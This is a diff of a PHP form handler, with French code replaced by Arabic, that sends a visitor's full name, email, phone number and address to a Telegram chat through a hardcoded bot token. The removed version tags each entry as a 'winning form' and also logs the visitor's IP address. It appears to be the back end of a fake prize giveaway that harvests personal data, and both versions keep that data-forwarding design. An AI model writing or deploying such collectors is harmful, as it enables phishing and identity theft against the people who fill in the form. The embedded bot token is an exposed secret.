@@ -1,96 +1,46 @@
 <?php
-// =======================
-//  CONFIG TELEGRAM
-// =======================
-$botToken = "6295685387:AAHb6p_xt8yrrMP918_sLdGKy_7ITJZ5beE"; // BOT TOKEN
-$chatId   = "5061239044"; // CHAT ID
+// إعدادات البوت
+$botToken = "6295685387:AAHb6p_xt8yrrMP918_sLdGKy_7ITJZ5beE";
+$chatId = "5061239044";
 
-// =======================
-//  TRAITEMENT FORMULAIRE
-// =======================
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    exit('Accès direct interdit.');
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // جلب البيانات من الفورم
+    $fullName = htmlspecialchars($_POST['fullName']);
+    $email = htmlspecialchars($_POST['email']);
+    $phone = htmlspecialchars($_POST['phone']);
+    $address = htmlspecialchars($_POST['address']);
+    
+    // صنع الرسالة
+    $message = "📋 طلب جديد\n";
+    $message .= "👤 الاسم الكامل: " . $fullName . "\n";
+    $message .= "📧 البريد الإلكتروني: " . $email . "\n";
+    $message .= "📞 رقم الهاتف: " . $phone . "\n";
+    $message .= "📍 العنوان: " . $address . "\n";
+    $message .= "⏰ الوقت: " . date('Y-m-d H:i:s');
+    
+    // إرسال الرسالة ل Telegram
+    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'Markdown'
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    // رد للمستخدم
+    echo "<script>
+            alert('تم إرسال البيانات بنجاح!');
+            window.location.href = 'index.html';
+          </script>";
+} else {
+    echo "خطأ: الطريقة غير مسموحة";
 }
-
-// Récupération sécurisée des champs
-$fullName = isset($_POST['fullName']) ? trim($_POST['fullName']) : '';
-$email    = isset($_POST['email'])    ? trim($_POST['email'])    : '';
-$phone    = isset($_POST['phone'])    ? trim($_POST['phone'])    : '';
-$address  = isset($_POST['address'])  ? trim($_POST['address'])  : '';
-
-// Vérification simple
-if ($fullName === '' || $email === '' || $phone === '' || $address === '') {
-    exit('Formulaire incomplet.');
-}
-
-// =======================
-//  MESSAGE POUR TELEGRAM
-// =======================
-$message  = "🎁 *Nouveau formulaire gagnant*\n\n";
-$message .= "*Nom complet :* " . $fullName . "\n";
-$message .= "*Email :* " . $email . "\n";
-$message .= "*Téléphone :* " . $phone . "\n";
-$message .= "*Adresse complète :* " . $address . "\n";
-$message .= "\n🌐 IP: " . $_SERVER['REMOTE_ADDR'];
-
-// =======================
-//  ENVOI VERS TELEGRAM
-// =======================
-$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-
-$data = [
-    'chat_id'    => $chatId,
-    'text'       => $message,
-    'parse_mode' => 'Markdown',
-];
-
-$options = [
-    "http" => [
-        "method"  => "POST",
-        "header"  => "Content-Type: application/x-www-form-urlencoded\r\n",
-        "content" => http_build_query($data),
-        "timeout" => 10
-    ]
-];
-
-$context = stream_context_create($options);
-$result  = file_get_contents($url, false, $context);
-
-// =======================
-//  PAGE DE CONFIRMATION
-// =======================
 ?>
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <title>Merci</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #b6063d;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            color: white;
-        }
-        .box {
-            background: white;
-            color: #b6063d;
-            padding: 30px 40px;
-            border-radius: 16px;
-            text-align: center;
-            max-width: 400px;
-        }
-        .box h1 { margin-top: 0; }
-    </style>
-</head>
-<body>
-<div class="box">
-    <h1>Merci ! 🎉</h1>
-    <p>Votre formulaire a bien été envoyé.</p>
-</div>
-</body>
-</html>
